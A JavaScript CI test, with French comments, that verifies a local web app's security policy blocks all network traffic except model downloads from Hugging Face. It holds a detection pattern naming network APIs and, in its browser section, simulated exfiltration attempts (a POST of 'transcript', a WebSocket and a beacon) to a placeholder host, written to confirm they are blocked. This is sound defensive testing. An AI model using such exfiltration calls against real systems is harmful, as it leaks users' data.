// Test de non-fuite réseau, rapide (quelques secondes, aucun modèle requis), lancé en CI.
//
// Volet statique (toujours) :
//   - la politique de sécurité de Lowsper.html n'autorise que Hugging Face en connexion, aucun
//     script, style, média, cadre ou formulaire distant, ni 'unsafe-inline' ni 'unsafe-eval' ;
//   - aucune API réseau (fetch, XMLHttpRequest, WebSocket, sendBeacon...) dans app/js, sauf le
//     téléchargement du modèle dans installer.js ; aucune adresse http(s) ailleurs ;
//   - aucune ressource distante dans la page ni dans les styles.
// Volet navigateur (--browser, Chromium requis) :
//   - la page ouverte en file:// ne fait aucune requête réseau ;
//   - une tentative d'envoi vers un autre site que Hugging Face est bloquée par la politique.
//
// Usage : node test/csp.mjs [--browser]   (CHROMIUM_PATH pour choisir le navigateur)
import { readFile, readdir } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import assert from 'node:assert/strict';

const here = dirname(fileURLToPath(import.meta.url));
const root = join(here, '..', '..');
const html = await readFile(join(root, 'Lowsper.html'), 'utf8');

let failed = 0;
async function test(name, fn) {
  try {
    await fn();
    console.log('OK    ' + name);
  } catch (e) {
    failed++;
    console.log('ÉCHEC ' + name + '\n      ' + e.message);
  }
}

// Seules origines réseau admises : Hugging Face, pour le téléchargement du modèle (decision.md §3)
const ALLOWED_CONNECT = ['https://huggingface.co', 'https://*.huggingface.co', 'https://*.hf.co'];

const metas = [...html.matchAll(/<meta\s+http-equiv="Content-Security-Policy"\s+content="([^"]+)"/gi)];
const csp = new Map(
  (metas[0] ? metas[0][1] : '')
    .split(';')
    .map((d) => d.trim().split(/\s+/))
    .filter((d) => d[0])
    .map(([name, ...values]) => [name, values])
);

await test('une seule politique de sécurité, déclarée avant tout script', () => {
  assert.equal(metas.length, 1, 'politique absente ou en double');
  assert.ok(html.indexOf(metas[0][0]) < html.indexOf('<script'), 'la politique doit précéder les scripts');
});

await test('connexions réseau : Hugging Face uniquement', () => {
  assert.deepEqual([...(csp.get('connect-src') || [])].sort(), [...ALLOWED_CONNECT].sort());
});

await test('tout est interdit par défaut (default-src none)', () => {
  assert.deepEqual(csp.get('default-src'), ["'none'"]);
  for (const d of ['object-src', 'frame-src', 'base-uri', 'form-action', 'font-src', 'media-src']) {
    assert.deepEqual(csp.get(d), ["'none'"], d);
  }
});

await test('aucune origine distante hors connect-src, ni unsafe-inline ni unsafe-eval', () => {
  for (const [name, values] of csp) {
    if (name === 'connect-src') continue;
    for (const v of values) {
      assert.ok(!/^(https?:|wss?:|\*)/.test(v) && !/\.\w{2,}$/.test(v), `${name} autorise ${v}`);
      assert.ok(v !== "'unsafe-inline'" && v !== "'unsafe-eval'", `${name} autorise ${v}`);
    }
  }
});

await test('page : aucune ressource distante (script, style, image, lien)', () => {
  const remote = [...html.matchAll(/\b(?:src|href)\s*=\s*"(https?:[^"]*|\/\/[^"]*)"/gi)].map((m) => m[1]);
  assert.deepEqual(remote, []);
});

const appJs = join(root, 'app', 'js');
const sources = Object.fromEntries(
  await Promise.all(
    (await readdir(appJs))
      .filter((f) => f.endsWith('.js'))
      .map(async (f) => [f, await readFile(join(appJs, f), 'utf8')])
  )
);
// Code sans commentaires, pour ne juger que ce qui s'exécute
const code = (s) => s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:\\])\/\/.*$/gm, '$1');

await test('API réseau : uniquement le téléchargement du modèle (installer.js)', () => {
  const NET =
    /\b(fetch|XMLHttpRequest|WebSocket|EventSource|sendBeacon|RTCPeerConnection|importScripts|WebTransport)\s*\(/g;
  const found = [];
  for (const [f, s] of Object.entries(sources)) {
    for (const m of code(s).matchAll(NET)) found.push(`${f}:${m[1]}`);
  }
  assert.deepEqual(found, ['installer.js:fetch'], 'appels réseau inattendus');
});

await test('adresses http(s) : uniquement Hugging Face, dans installer.js', () => {
  const found = [];
  for (const [f, s] of Object.entries(sources)) {
    for (const m of code(s).matchAll(/['"`](https?:\/\/[^'"`]*)/g)) {
      if (!(f === 'installer.js' && m[1] === 'https://huggingface.co')) found.push(`${f}:${m[1]}`);
    }
  }
  assert.deepEqual(found, []);
});

await test('styles : aucune ressource distante', async () => {
  const css = await readFile(join(root, 'app', 'css', 'lowsper.css'), 'utf8');
  assert.ok(!/@import|url\(\s*['"]?(https?:|\/\/)/i.test(css));
});

if (process.argv.includes('--browser')) {
  const { chromium } = await import('playwright-core');
  const browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PATH || undefined });
  const page = await browser.newPage();
  const requests = [];
  page.on('request', (r) => {
    if (!/^(file|blob|data):/.test(r.url())) requests.push(r.url());
  });
  await page.goto(pathToFileURL(join(root, 'Lowsper.html')).href);
  await page.waitForLoadState('load');
  await page.waitForTimeout(2000);

  await test('navigateur : la page ouverte ne fait aucune requête réseau', () => {
    assert.deepEqual(requests, []);
  });

  await test('navigateur : un envoi vers un autre site est bloqué par la politique', async () => {
    const r = await page.evaluate(async () => {
      const blocked = [];
      document.addEventListener('securitypolicyviolation', (e) => blocked.push(e.violatedDirective));
      const tries = [
        fetch('https://exemple.invalid/fuite', { method: 'POST', body: 'transcript' }).then(
          () => 'envoyé',
          () => 'bloqué'
        ),
        new Promise((res) => {
          const ws = new WebSocket('wss://exemple.invalid/');
          ws.onerror = () => res('bloqué');
          ws.onopen = () => res('envoyé');
        }).catch(() => 'bloqué'),
        Promise.resolve(navigator.sendBeacon('https://exemple.invalid/b', 'x') ? 'accepté' : 'bloqué'),
      ];
      const out = await Promise.all(tries);
      await new Promise((res) => setTimeout(res, 300));
      return { out, blocked };
    });
    assert.deepEqual(r.out.slice(0, 2), ['bloqué', 'bloqué']);
    assert.ok(r.blocked.filter((d) => d.startsWith('connect-src')).length >= 2, 'violations : ' + r.blocked.join(', '));
  });
  await browser.close();
  await test("navigateur : aucune requête n'est réellement partie", () => {
    assert.deepEqual(
      requests.filter((u) => !/exemple\.invalid/.test(u)),
      []
    );
  });
}

if (failed) {
  console.log(`\n${failed} test(s) de non-fuite en échec.`);
  process.exit(1);
}
console.log('\nAucune fuite réseau possible détectée.');
